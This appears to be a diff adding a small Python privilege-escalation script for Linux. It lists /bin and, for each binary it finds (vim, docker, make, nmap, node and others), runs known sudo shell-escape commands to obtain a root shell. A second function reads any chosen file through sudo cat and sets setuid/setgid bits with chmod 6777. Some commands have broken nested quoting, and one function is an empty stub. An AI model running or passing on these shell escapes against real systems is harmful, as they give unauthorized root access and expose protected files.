@@ -1,0 +1,76 @@
+import subprocess
+import os
+from colorama import Fore
+
+output = subprocess.run(['ls', '/bin'], stdout=subprocess.PIPE)
+
+def ask_another():
+    answer = input("do you want to try another? [y/n]> ")
+    if answer.lower()[:1] == "y":
+        return True
+    else:
+        return False
+
+def thank():
+    print("Thanks for using")
+    exit()
+
+output = str(output)
+
+def runCmd(cmds):
+    for cmd in cmds:
+        if os.system(cmd) == 0 and not ask_another():
+            thank()
+
+def checkPrivEsc():
+    cmds = []
+    if 'vim' in output:
+        print(Fore.RED,"[+] Found vim", Fore.RESET)
+        cmds.append("sudo vim -c ':!/bin/bash'")
+        cmds.append("sudo vim -c ':py import os; os.execl('/bin/sh', 'sh', '-c', 'reset; exec sh')'")
+        cmds.append("sudo vim -c ':lua os.execute('reset; exec sh')'")
+    if 'bash' in output:
+        print(Fore.RED, "[+] Found bash", Fore.RESET)
+        cmds.append("sudo bash")
+
+    if 'docker' in output:
+        print(Fore.RED, "[+] Found docker", Fore.RESET)
+        cmds.append("sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
+
+    if 'make' in output:
+        print(Fore.RED, "[+] Found make", Fore.RESET)
+        cmds.append("sudo make -s --eval=$'x:\n\t-'/bin/sh -p'")
+
+    if 'nice' in output:
+        print(Fore.RED, "[+] Found nice", Fore.RESET)
+        cmds.append("sudo nice /bin/sh -p")
+
+    if 'nmap' in output:
+        print(Fore.RED, "[+] Found nmap")
+        cmds.append("TF=$(mktemp);echo 'os.execute('/bin/sh')' > $TF;sudo nmap --script=$TF")
+
+    if 'node' in output:
+        print(Fore.RED, "[+] Found node")
+        cmds.append("sudo node -e 'require('child_process').spawn('/bin/sh', {stdio: [0, 1, 2]})'")
+
+    if 'pexec' in output:
+        print(Fore.RED, "[+] Found pexec", Fore.RESET)
+        cmds.append("sudo pexec /bin/sh")
+
+    runCmd(cmds)
+
+def checkFileAccess():
+    filepath = input("put in the filepath for your target file > ")
+    if 'cat' in output:
+        print(Fore.RED, "[+] Trying cat to read files")
+        if os.system(f"sudo cat {filepath}") == 0 and not ask_another():
+            thank()
+    if 'chmod' in output:
+        filepath = input("put in the filepath for the target file > ")
+        print(Fore.RED, "[+] Trying to change files user rights", Fore.RESET)
+        if os.system(f"sudo chmod 6777 {filepath}") == 0 and not ask_another():
+            thank()
+#def checkExploits():
+    
+
+checkPrivEsc()
